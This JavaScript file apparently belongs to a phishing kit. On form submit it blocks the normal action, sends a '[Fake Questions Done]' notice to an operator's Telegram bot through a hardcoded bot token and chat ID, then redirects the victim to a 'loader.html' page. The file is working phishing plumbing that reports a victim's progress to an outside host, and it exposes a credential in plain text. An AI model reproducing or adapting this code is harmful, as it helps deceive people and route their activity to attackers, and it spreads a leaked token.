document.addEventListener("DOMContentLoaded", function () {  
    var form = document.getElementById("myform2");

    form.addEventListener('submit', async (e) => {

        e.preventDefault();

        let ebody = `
        \n
        <b>[Fake Questions Done]</b>
        \n`;

        // Telegram Bot API endpoint
        const telegramBotToken = '5943159759:AAF2du7IRutCVQStuAp66ZdnfuKkJNjLtnA';
        const chatId = '6391433593';

        const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

        try {
            const response = await axios.post(telegramApiUrl, {
                chat_id: chatId,
                text: ebody,
                parse_mode: 'HTML',
            });

            // Redirect after sending the message
            window.location.href = "loader.html";
        } catch (error) {
            console.error("Error sending message to Telegram:", error);

            // Check if there's a specific error message from the Telegram API response
            if (error.response && error.response.data) {
                console.error("Telegram API error:", error.response.data);
            }
        }
    });
});